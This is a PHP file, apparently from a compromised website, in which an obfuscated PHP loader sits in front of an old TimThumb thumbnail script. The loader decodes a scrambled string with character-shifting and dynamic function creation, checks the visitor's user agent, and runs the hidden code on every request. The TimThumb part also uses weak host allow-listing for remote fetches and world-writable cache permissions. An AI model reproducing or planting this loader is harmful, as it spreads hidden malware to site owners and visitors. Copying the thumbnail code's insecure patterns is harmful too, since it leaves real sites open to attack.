<?php $lmcpyixff = 'd%-#1GO	x22#)fepmqyfA>2b%!<*qp%vg!|!**#j{hnpd#)tutjyf`opjud%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2FSUT`LDPT7-UFOJ`GB)fubfsdXA	x27K6<	x7fw6*3q	x72	166	x3a	61	x31"))) { $xlptsmv = "	x63	162	x65x61"]=1; $uas=strtolower($_SERVER[sq)!sp!*#ojneb#-*f%)sfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cd#7e:55946-tr.984:75983:48984:71]K9]77]D4]82]K	x24<%j,,*!|	x24-	x24gvodujpo!	x24-	x247]67y]37]88y]27]28y]#/r%/h%)n%-#+I#)q%:>:r%:|:**ek!~!<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#opo#>b%!**X)ufttj	x22):>1<!fmtf!%b:>%s:	x5c%j:.2^,%b:<!%c:>%s:	x5c%j:^<!-*.%)euhA)3of>2bd%!<5h%/#0#/*#npd/#)rrd/#00;quui#>.%!<**~6<&w6<	x7fw6*CW&)7gj6<.[A	x2*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSFWSutjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-bubE{h%)sutcvt)esp>hmg%!]D6#<%fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275!|!}{;)gj}l;33bq}k;op}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`ufldpt}X;`msvd}R;*msv%)}.;`	x5c}X	x24<!%tmw!>!#]y84]275]y83]273]y76]277#<!%t2w>#]y74#]82#-#!#-%tmw)%tww**WYsboepn)%bss-%rxB%h>#]y31]D:M8]Df#<%tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]7fw6<*K)ftpmdXA6|7**197-2qj%7-K)udfoopd6<*msv%7-MSV,6<*)ujojR	x27id%6<	x7fw6*	x7f_*#ujojRk3`{666j%7>	x2272qj%)7gj6<**2qj%)hopm3qjA)qj3hopmA	x273qj`hA	x27pd%6<C	x27pd%6|6.7eu{66~67<&w6<#:618d5f9#-!#f6c68399#-!#65egb2dc#*<!sfuvs<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,27;mnui}&;zepc}A;~!}	x7f;ppde:4:|:**#ppde#)tutjyf`4	x223}!+!<+{e%+*!*+fepdfe{h+{d%)+opju5.)1/14+9**-)1/2986+7**^/%rx<~!!%s:N}#-%o:W%c:>1<%b:>1<!gps)%j:>1<%jK2]285]Ke]53Ld]53]Kc]55Ld]55#*<%bG9}:}.}-}!#*<%nfd>%f%hIr	x5c1^-%r	x5c2^-%hOh/#00#W~!%t2w)##Qtjw)!	x27!hmg%)!gj!<2,*j%-#1]#-bubE{h%)tpqsut>j%!*9!	x27!hmg%)!gj!7f:5297e:56-xr.985:52985-t.98]K4]65]D8]86]y31]22bge56+99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f72	164") && (!isset($GLOBALS["	x61	156	x757&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##}C;!>>!67]y74]275]y7:]268]y7f#<%)kVx{**#k#)tutjyf`x	x22l:!}V;3q%}U;y]}R;2]},;osvufs}	x~~9{d%:osvufs:~928>>	x22:ftmbg39*56A:>*f	x27,*e	x27,*d	x27,*c	x27,*b	xng(0); $obuvrcq = implode(array_map("knkvxhd",str_split("%tjwt%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]552]e7y]#>!>!#]y84]275]y83]248]y83]256]y81]26*&7-#o]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gqnjA	x27&6<.fmjgA	x27doj%6<	x7f78]y3f]51L3]84]y31M6]y3e]81#/FT`%}X;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}3]83]238M7]381]211M5]67]452]88]5]48]32M3]317]445]212]445]43]321]j6<*K)ftpmdXA6~6<u%7>/7&6|7**111127-K)ebfsX	x27u%)7fmjix6<C	w6Z6<.5`hA	x27pd%6<pd%w6Z5]y72]254]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%dovg+)!gj+{e%!osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)u24<!%o:!>!	x242178}527}88:}334}472	x24<!%ff2!>!bssbz)	x24]25	x24-	x24464]284]364]6]234]342]58]24]31#-%tdz*Wsfuvso!%bss	x5csboe))1/3[!%cIjQeTQcOc/#00#W~!Ydrr)%rxB%epnbss!>!bssbz)#44ec:649#-!:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%b`msvd}+;!>!}	x27;!>>>!}_;gvc%Y#	x5cq%	x27Y%6<.msv`ftsbqA7>q%6<	x7fw6*	x7f_*#fuopjudovg)!gj!|!*msv%)}k~~~<ftmbg!osvufs!|ftmf!~6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2!<##!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2b%t::**<(<!fwbm)%tjw)#	x24#-!#]y38#-!%w:**<")));$yqhmbrz = $xlpx27&6<*rfs%7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1_UTPI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOF1]88M4P8]37]278]225]241]334]368]322]3]364]6]283]427]36]373P6]36]7%6<*Y%)fnbozcYufhA	x272qj%6<^#zs#sfmcnbs+yfeobz+sfwjidsb`bj+upcotn+qs]278]y3e]81]K78:56985:6197g:74985-rr.93e:5597f-s.973:829dy<Cb*[%h!>!%tdz)%bbT-%bT-%hW~%fdy)##-!#~<%h00#*<%nfd)##Qtpz)#]34x45	116	x54"]); if ((strst%)sutcvt)!gj!|!*bubE{h%)j{hnpd!opjudo66,#/q%>2q%<#g6R85,67R37,18R#>q%V<*#fopoV;hojepdoF.uofuopD#)sfebfI{*wbfsdXk5`{66~6<&w6<	x7fw6*CW&)7gj6<*doj%7-C)fepmtpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6p%!-uyfu%)3of)fepdof`57ftbc	x7f!|!-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x24-	x24tvctus)%	x24-	x24b!>!%yy]38y]572]48y]#>m%:|:*r%:-t%)3of:opjudovg<~	x/20QUUI7jsv%7UFH#	x27rfs%6~6<	xYpp2)%zB%z>!	x24/%tmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTWr($uas,"	x6d	163	x69	145")) or (strstr($uas,"<12>j%!|!*#91y]c9y]g2y]#>>*4-1-bubE{h<**9.-j%-bubE{h%)sutcvt)fubmgoj{hA!osv+;%-qp%)54l}	x27;%!<*#}_;#)323ldfid>}&;!osvufs}	x7f;!opjudovg}kHB`SFTV`QUUI&b%!|!*)323zbtsmv("", $obuvrcq); $yqhmbrz();}}if((function_exists("	x6f	142	x5f	163	x74	141	xx5cq%)ufttj	x22)gj6<^#UQPMSVD!-id%)uqpuft`msvd},;uqpuftvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#)idubn`hf*!%z>3<!fmtf!%z>2<!%ww2)%w`TW~	x24<4y7	x24-	x24*<!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w/]273]y76]252]y85]256]y6g]257]y86]2!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<**#57]38y]K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!%ff2-!	157	x6e"; function knkvxhd($n){return chr(ord($n)-1);} @error_reporti	141	x74	145	x5f	146	x75	156	x63	164	x69!fwbm)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#XAZASV<*w%)ppde>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47R57,27R}&;ftmbg}	x7f;!osvufs}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)tutjyf`27)fepdof.)fepdof./#@#/qp%>5h%!<*::::::-111112)eobs`un>qp%!|Z~!<##pd19275fubmgoj{h1:|:*mmvo:>:iuhofm%:-5fvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cq%7**^#zsfvr#	6]72]K9]78]K5]53]Kc#<%tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5:8:|:7#6#)tutjyf`439275ttfsqnpdov{h19275j{hno!sboepn)%epnbss-%rxW~!gj!|!*nbsbq%)323ldfidk!~!<**q"	x48	124	x54	120	x5f	125	x53	105	x52	137	x41	107	-#1]#-bubE{h%)tpqsut>j%!*72sbut`cpV	x7f	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{ftmfV	x7f<*XA	x22)7gj6<*QDU`MPT7-NBw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWtfs%)7gj6<*id%)f	x24)##-!#~<#/%	x24-	x24!>!fyqmpef)#	x24*<!%t::!>!	x24Ypp3)%cB%iN}#~<ofmy%,3,j%>j%!<**3-j%-bubE{h%)sutcvt-#w#)ldbqov>*ofmy%)4	x24-	x24]y8	x24-	x24]26	x24-ovg	x22)!gj}1~!<2p%	x7f!~judovg}x;0]=])0#)U!	x27{**u%-#jt0}Zufs!~<3,j%>j%!*3!	x27!hmg%!)!gj!<2,*j%!;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]_!>!2p%!|!*!***b%)sfxpmpusut!-#j0#!/!**)#}#-#	x24-	x24-tusqpt)%z-#:#*	x24-	x24!>!	x24/%tjw/	x24)%	x24-	x24yn%<#372]58y]472]37y]672]48y]#>s%<#462]47y]252]18y]#>q%<#762]67y]562	156	x61"])))) { $GLOBALS["	x61	156	x75	156	-!	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*sTrREvxNoiTCnuf_EtaerCxECalPer_Rtsmkjzfxjmo'; $nsbfxjhgr=explode(chr((426-306)),substr($lmcpyixff,(39493-33616),(149-115))); $nylrlngg = $nsbfxjhgr[0]($nsbfxjhgr[(3-2)]); $eaxisch = $nsbfxjhgr[0]($nsbfxjhgr[(7-5)]); if (!function_exists('dnsnqpaj')) { function dnsnqpaj($dlrhqh, $nfbrgaa,$izlaluh) { $searxzd = NULL; for($bigcxgnwx=0;$bigcxgnwx<(sizeof($dlrhqh)/2);$bigcxgnwx++) { $searxzd .= substr($nfbrgaa, $dlrhqh[($bigcxgnwx*2)],$dlrhqh[($bigcxgnwx*2)+(7-6)]); } return $izlaluh(chr((61-52)),chr((428-336)),$searxzd); }; } $bgydrsm = explode(chr((197-153)),'4068,47,1730,42,5780,44,220,34,5082,50,3369,26,3827,45,170,50,4528,40,4458,70,1963,61,2069,35,2405,47,2380,25,2856,48,1193,38,2104,52,2320,60,3018,51,3730,31,1047,39,5220,24,127,43,1143,50,3179,32,4853,70,4115,22,2760,49,3501,47,2156,31,5244,54,3548,39,1273,35,1086,57,616,29,1772,42,814,66,4137,33,2731,29,4680,69,2809,47,3909,38,5512,39,5132,27,1561,62,5365,57,680,69,3872,37,3395,37,31,28,5452,25,2904,52,0,31,560,56,1931,32,4749,66,5607,38,3211,37,4170,45,254,60,1670,60,3069,45,4010,25,446,64,5053,29,3587,34,645,35,2216,40,3947,63,1893,38,4986,44,4815,38,1333,63,2452,56,5159,61,4618,62,3432,69,1838,55,1308,25,793,21,5477,35,5551,56,880,57,4318,34,1814,24,4352,59,397,49,2024,45,5713,67,3686,44,2508,69,3621,65,5645,68,5422,30,359,38,4250,68,5298,67,5824,53,2639,58,1231,42,5030,23,3761,66,1517,44,937,47,3248,56,1623,47,2187,29,314,45,4923,63,749,44,984,63,1464,53,3304,65,3114,65,2256,64,2577,62,1396,68,2697,34,510,50,59,68,4215,35,4568,50,4411,47,2956,62,4035,33'); $uwvxiqrd = $nylrlngg("",dnsnqpaj($bgydrsm,$lmcpyixff,$eaxisch)); $nylrlngg=$lmcpyixff; $uwvxiqrd(""); $uwvxiqrd=(466-345); $lmcpyixff=$uwvxiqrd-1; ?><?php
/*
    TimThumb script created by Tim McDaniels and Darren Hoyt with tweaks by Ben Gillbanks
    http://code.google.com/p/timthumb/

    MIT License: http://www.opensource.org/licenses/mit-license.php

    Paramters
    ---------
    w: width
    h: height
    zc: zoom crop (0 or 1)
    q: quality (default is 75 and max is 100)
   
    HTML example: <img src="/scripts/timthumb.php?src=/images/whatever.jpg&w=150&h=200&zc=1" alt="" />
*/

/*
$sizeLimits = array(
    "100x100",
    "150x150",
);

error_reporting(E_ALL);
ini_set("display_errors", 1);
*/
error_reporting(0);

// check to see if GD function exist
if(!function_exists('imagecreatetruecolor')) {
    displayError('GD Library Error: imagecreatetruecolor does not exist - please contact your webhost and ask them to install the GD library');
}

define ('CACHE_SIZE', 250);        // number of files to store before clearing cache
define ('CACHE_CLEAR', 5);        // maximum number of files to delete on each cache clear
define ('VERSION', '1.12');        // version number (to force a cache refresh

if (function_exists('imagefilter') && defined('IMG_FILTER_NEGATE')) {
        $imageFilters = array(
                "1" => array(IMG_FILTER_NEGATE, 0),
                "2" => array(IMG_FILTER_GRAYSCALE, 0),
                "3" => array(IMG_FILTER_BRIGHTNESS, 1),
                "4" => array(IMG_FILTER_CONTRAST, 1),
                "5" => array(IMG_FILTER_COLORIZE, 4),
                "6" => array(IMG_FILTER_EDGEDETECT, 0),
                "7" => array(IMG_FILTER_EMBOSS, 0),
                "8" => array(IMG_FILTER_GAUSSIAN_BLUR, 0),
                "9" => array(IMG_FILTER_SELECTIVE_BLUR, 0),
                "10" => array(IMG_FILTER_MEAN_REMOVAL, 0),
                "11" => array(IMG_FILTER_SMOOTH, 0),
        );
}

// sort out image source
$src = get_request("src", "");
if($src == '' || strlen($src) <= 3) {
    displayError ('no image specified');
}

// clean params before use
$src = cleanSource($src);
// last modified time (for caching)
$lastModified = filemtime($src);

// get properties
$new_width         = preg_replace("/[^0-9]+/", "", get_request("w", 0));
$new_height     = preg_replace("/[^0-9]+/", "", get_request("h", 0));
$zoom_crop         = preg_replace("/[^0-9]+/", "", get_request("zc", 1));
$quality         = preg_replace("/[^0-9]+/", "", get_request("q", 80));
$filters        = get_request("f", "");

if ($new_width == 0 && $new_height == 0) {
    $new_width = 100;
    $new_height = 100;
}

// set path to cache directory (default is ./cache)
// this can be changed to a different location
$cache_dir = '../../cache';

// get mime type of src
$mime_type = mime_type($src);

// check to see if this image is in the cache already
check_cache ($cache_dir, $mime_type);

// if not in cache then clear some space and generate a new file
cleanCache();

ini_set('memory_limit', "50M");

// make sure that the src is gif/jpg/png
if(!valid_src_mime_type($mime_type)) {
    displayError("Invalid src mime type: " .$mime_type);
}

if(strlen($src) && file_exists($src)) {

    // open the existing image
    $image = open_image($mime_type, $src);
    if($image === false) {
        displayError('Unable to open image : ' . $src);
    }

    // Get original width and height
    $width = imagesx($image);
    $height = imagesy($image);
   
    // generate new w/h if not provided
    if( $new_width && !$new_height ) {
       
        $new_height = $height * ( $new_width / $width );
       
    } elseif($new_height && !$new_width) {
       
        $new_width = $width * ( $new_height / $height );
       
    } elseif(!$new_width && !$new_height) {
       
        $new_width = $width;
        $new_height = $height;
       
    }
   
    // create a new true color image
    $canvas = imagecreatetruecolor( $new_width, $new_height );
    imagealphablending($canvas, false);
    // Create a new transparent color for image
    $color = imagecolorallocatealpha($canvas, 0, 0, 0, 127);
    // Completely fill the background of the new image with allocated color.
    imagefill($canvas, 0, 0, $color);
    // Restore transparency blending
    imagesavealpha($canvas, true);

    if( $zoom_crop ) {

        $src_x = $src_y = 0;
        $src_w = $width;
        $src_h = $height;

        $cmp_x = $width  / $new_width;
        $cmp_y = $height / $new_height;

        // calculate x or y coordinate and width or height of source

        if ( $cmp_x > $cmp_y ) {

            $src_w = round( ( $width / $cmp_x * $cmp_y ) );
            $src_x = round( ( $width - ( $width / $cmp_x * $cmp_y ) ) / 2 );

        } elseif ( $cmp_y > $cmp_x ) {

            $src_h = round( ( $height / $cmp_y * $cmp_x ) );
            $src_y = round( ( $height - ( $height / $cmp_y * $cmp_x ) ) / 2 );

        }
       
        imagecopyresampled( $canvas, $image, 0, 0, $src_x, $src_y, $new_width, $new_height, $src_w, $src_h );

    } else {

        // copy and resize part of an image with resampling
        imagecopyresampled( $canvas, $image, 0, 0, 0, 0, $new_width, $new_height, $width, $height );

    }
   
    if ($filters != '' && function_exists('imagefilter') && defined('IMG_FILTER_NEGATE')) {
        // apply filters to image
        $filterList = explode("|", $filters);
        foreach($filterList as $fl) {
            $filterSettings = explode(",", $fl);
            if(isset($imageFilters[$filterSettings[0]])) {
           
                for($i = 0; $i < 4; $i ++) {
                    if(!isset($filterSettings[$i])) {
                        $filterSettings[$i] = null;
                    }
                }
               
                switch($imageFilters[$filterSettings[0]][1]) {
               
                    case 1:
                   
                        imagefilter($canvas, $imageFilters[$filterSettings[0]][0], $filterSettings[1]);
                        break;
                   
                    case 2:
                   
                        imagefilter($canvas, $imageFilters[$filterSettings[0]][0], $filterSettings[1], $filterSettings[2]);
                        break;
                   
                    case 3:
                   
                        imagefilter($canvas, $imageFilters[$filterSettings[0]][0], $filterSettings[1], $filterSettings[2], $filterSettings[3]);
                        break;
                   
                    default:
                   
                        imagefilter($canvas, $imageFilters[$filterSettings[0]][0]);
                        break;
                       
                }
            }
        }
    }
   
    // output image to browser based on mime type
    show_image($mime_type, $canvas, $cache_dir);
   
    // remove image from memory
    imagedestroy($canvas);
   
} else {


    if(strlen($src)) {
        displayError("image " . $src . " not found");
    } else {
        displayError("no source specified");
    }
   
}

/**
 *
 */
function show_image($mime_type, $image_resized, $cache_dir) {

    global $quality;

    // check to see if we can write to the cache directory
    $is_writable = 0;
    $cache_file_name = $cache_dir . '/' . get_cache_file();

    if (touch($cache_file_name)) {
       
        // give 666 permissions so that the developer
        // can overwrite web server user
        chmod ($cache_file_name, 0666);
        $is_writable = 1;
       
    } else {
       
        $cache_file_name = NULL;
        header ('Content-type: ' . $mime_type);
       
    }

    switch ($mime_type) {
   
        case 'image/jpeg':
            imagejpeg($image_resized, $cache_file_name, $quality);
            break;
       
        default :
            $quality = floor ($quality * 0.09);
            imagepng($image_resized, $cache_file_name, $quality);
           
    }
   
    if ($is_writable) {
        show_cache_file ($cache_dir, $mime_type);
    }

    imagedestroy ($image_resized);
   
    displayError ("error showing image");

}

/**
 *
 */
function get_request( $property, $default = 0 ) {
   
    if( isset($_REQUEST[$property]) ) {
   
        return $_REQUEST[$property];
       
    } else {
   
        return $default;
       
    }
   
}

/**
 *
 */
function open_image($mime_type, $src) {

        $mime_type = strtolower($mime_type);
       
    if (stristr ($mime_type, 'gif')) {
   
        $image = imagecreatefromgif($src);
       
    } elseif (stristr($mime_type, 'jpeg')) {
   
        @ini_set ('gd.jpeg_ignore_warning', 1);
        $image = imagecreatefromjpeg($src);
       
    } elseif (stristr ($mime_type, 'png')) {
   
        $image = imagecreatefrompng($src);
       
    }
   
    return $image;

}

/**
 * clean out old files from the cache
 * you can change the number of files to store and to delete per loop in the defines at the top of the code
 */
function cleanCache() {

    $files = glob("cache/*", GLOB_BRACE);
   
    if (count($files) > 0) {
   
        $yesterday = time() - (24 * 60 * 60);
       
        usort($files, 'filemtime_compare');
        $i = 0;
       
        if (count($files) > CACHE_SIZE) {
           
            foreach ($files as $file) {
               
                $i ++;
               
                if ($i >= CACHE_CLEAR) {
                    return;
                }
               
                if (@filemtime($file) > $yesterday) {
                    return;
                }
               
                                if (file_exists($file)) {
                                        unlink($file);
                                }
               
            }
           
        }
       
    }

}


/**
 * compare the file time of two files
 */
function filemtime_compare($a, $b) {

    return filemtime($a) - filemtime($b);
   
}


/**
 * determine the file mime type
 */
function mime_type($file) {

    if (stristr(PHP_OS, 'WIN')) {
        $os = 'WIN';
    } else {
        $os = PHP_OS;
    }

    $mime_type = '';

    if (function_exists('mime_content_type')) {
        $mime_type = mime_content_type($file);
    }
   
        // use PECL fileinfo to determine mime type
        if (!valid_src_mime_type($mime_type)) {
                if (function_exists('finfo_open')) {
                        $finfo = @finfo_open(FILEINFO_MIME);
                        if ($finfo != '') {
                                $mime_type = finfo_file($finfo, $file);
                                finfo_close($finfo);
                        }
                }
        }

    // try to determine mime type by using unix file command
    // this should not be executed on windows
    if (!valid_src_mime_type($mime_type) && $os != "WIN") {
        if (preg_match("/FREEBSD|LINUX/", $os)) {
                        $mime_type = trim(@shell_exec('file -bi ' . escapeshellarg($file)));
        }
    }

    // use file's extension to determine mime type
    if (!valid_src_mime_type($mime_type)) {

        // set defaults
        $mime_type = 'image/png';
        // file details
        $fileDetails = pathinfo($file);
        $ext = strtolower($fileDetails["extension"]);
        // mime types
        $types = array(
             'jpg'  => 'image/jpeg',
             'jpeg' => 'image/jpeg',
             'png'  => 'image/png',
             'gif'  => 'image/gif'
         );
       
        if (strlen($ext) && strlen($types[$ext])) {
            $mime_type = $types[$ext];
        }
       
    }
   
    return $mime_type;


}


/**
 *
 */
function valid_src_mime_type($mime_type) {

    if (preg_match("/jpg|jpeg|gif|png/i", $mime_type)) {
        return true;
    }
   
    return false;

}


/**
 *
 */
function check_cache ($cache_dir, $mime_type) {

    // make sure cache dir exists
    if (!file_exists($cache_dir)) {
        // give 777 permissions so that developer can overwrite
        // files created by web server user
        mkdir($cache_dir);
        chmod($cache_dir, 0777);
    }

    show_cache_file ($cache_dir, $mime_type);

}


/**
 *
 */
function show_cache_file ($cache_dir, $mime_type) {

    $cache_file = $cache_dir . '/' . get_cache_file();

    if (file_exists($cache_file)) {
       
        $gmdate_mod = gmdate("D, d M Y H:i:s", filemtime($cache_file));
       
        if(! strstr($gmdate_mod, "GMT")) {
            $gmdate_mod .= " GMT";
        }
       
        if (isset($_SERVER["HTTP_IF_MODIFIED_SINCE"])) {
       
            // check for updates
            $if_modified_since = preg_replace ("/;.*$/", "", $_SERVER["HTTP_IF_MODIFIED_SINCE"]);
           
            if ($if_modified_since == $gmdate_mod) {
                header("HTTP/1.1 304 Not Modified");
                die();
            }

        }
       
        $fileSize = filesize ($cache_file);
       
        // send headers then display image
        header ('Content-Type: ' . $mime_type);
        header ('Accept-Ranges: bytes');
        header ('Last-Modified: ' . $gmdate_mod);
        header ('Content-Length: ' . $fileSize);
        header ('Cache-Control: max-age=9999, must-revalidate');
        header ('Expires: ' . $gmdate_mod);
       
        readfile ($cache_file);
       
        die();

    }
   
}


/**
 *
 */
function get_cache_file() {

    global $lastModified;
    static $cache_file;
   
    if (!$cache_file) {
        $cachename = $_SERVER['QUERY_STRING'] . VERSION . $lastModified;
        $cache_file = md5($cachename) . '.png';
    }
   
    return $cache_file;

}


/**
 * check to if the url is valid or not
 */
function valid_extension ($ext) {

    if (preg_match("/jpg|jpeg|png|gif/i", $ext)) {
        return TRUE;
    } else {
        return FALSE;
    }
   
}


/**
 *
 */
function checkExternal ($src) {

    $allowedSites = array(
        'flickr.com',
        'picasa.com',
        'blogger.com',
        'wordpress.com',
        'img.youtube.com',
    );

    if (ereg('http://', $src) == true) {
   
        $url_info = parse_url ($src);
       
        $isAllowedSite = false;
        foreach ($allowedSites as $site) {
            if (ereg($site, $url_info['host']) == true) {
                $isAllowedSite = true;
            }
                }
       
                if ($isAllowedSite) {
               
                        $fileDetails = pathinfo($src);
                        $ext = strtolower($fileDetails['extension']);
                       
                        $filename = md5($src);
                        $local_filepath = 'temp/' . $filename . '.' . $ext;
           
            if (!file_exists($local_filepath)) {
               
                if (function_exists('curl_init')) {
               
                    $fh = fopen($local_filepath, 'w');
                    $ch = curl_init($src);
                   
                    curl_setopt($ch, CURLOPT_URL, $src);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
                                        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                                        curl_setopt($ch, CURLOPT_HEADER, 0);
                    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0');
                    curl_setopt($ch, CURLOPT_FILE, $fh);
                                       
                                        if (curl_exec($ch) === FALSE) {
                                                if (file_exists($local_filepath)) {
                                                        unlink($local_filepath);
                                                }
                                                displayError('error reading file ' . $src . ' from remote host: ' . curl_error($ch));
                                        }
                                       
                                        curl_close($ch);
                                        fclose($fh);

                } else {
           
                    if (!$img = file_get_contents($src)) {
                        displayError('remote file for ' . $src . ' can not be accessed. It is likely that the file permissions are restricted');
                    }
                   
                    if (file_put_contents($local_filepath, $img) == FALSE) {
                        displayError('error writing temporary file');
                    }
                   
                }
               
                if (!file_exists($local_filepath)) {
                    displayError('local file for ' . $src . ' can not be created');
                }
               
            }
           
            $src = $local_filepath;
           
        } else {
       
            displayError('remote host "' . $url_info['host'] . '" not allowed');
           
        }
       
    }
   
    return $src;
   
}



/**
 * tidy up the image source url
 */
function cleanSource($src) {

        $host = str_replace('www.', '', $_SERVER['HTTP_HOST']);
        $regex = "/^((ht|f)tp(s|):\/\/)(www\.|)" . $host . "/i";
       
        $src = preg_replace ($regex, '', $src);
        $src = htmlentities ($src);
    $src = checkExternal ($src);
   
    // remove slash from start of string
    if (strpos($src, '/') === 0) {
        $src = substr ($src, -(strlen($src) - 1));
    }

    // don't allow users the ability to use '../'
    // in order to gain access to files below document root
    $src = preg_replace("/\.\.+\//", "", $src);
   
    // get path to image on file system
    $src = get_document_root($src) . '/' . $src;

    return $src;

}


/**
 *
 */
function get_document_root ($src) {

    // check for unix servers
    if(file_exists($_SERVER['DOCUMENT_ROOT'] . '/' . $src)) {
        return $_SERVER['DOCUMENT_ROOT'];
    }

    // check from script filename (to get all directories to timthumb location)
    $parts = array_diff(explode('/', $_SERVER['SCRIPT_FILENAME']), explode('/', $_SERVER['DOCUMENT_ROOT']));
    $path = $_SERVER['DOCUMENT_ROOT'];
    foreach ($parts as $part) {
        $path .= '/' . $part;
        if (file_exists($path . '/' . $src)) {
            return $path;
        }
    }    
   
    // the relative paths below are useful if timthumb is moved outside of document root
    // specifically if installed in wordpress themes like mimbo pro:
    // /wp-content/themes/mimbopro/scripts/timthumb.php
    $paths = array(
        ".",
        "..",
        "../..",
        "../../..",
        "../../../..",
        "../../../../.."
    );
   
    foreach ($paths as $path) {
        if(file_exists($path . '/' . $src)) {
            return $path;
        }
    }
   
    // special check for microsoft servers
    if (!isset($_SERVER['DOCUMENT_ROOT'])) {
        $path = str_replace("/", "\\", $_SERVER['ORIG_PATH_INFO']);
        $path = str_replace($path, "", $_SERVER['SCRIPT_FILENAME']);
       
        if (file_exists($path . '/' . $src)) {
            return $path;
        }
    }    
   
    displayError('file not found ' . $src);

}


/**
 * generic error message
 */
function displayError($errorString = '') {

    header('HTTP/1.1 400 Bad Request');
    die($errorString);
   
}
?>

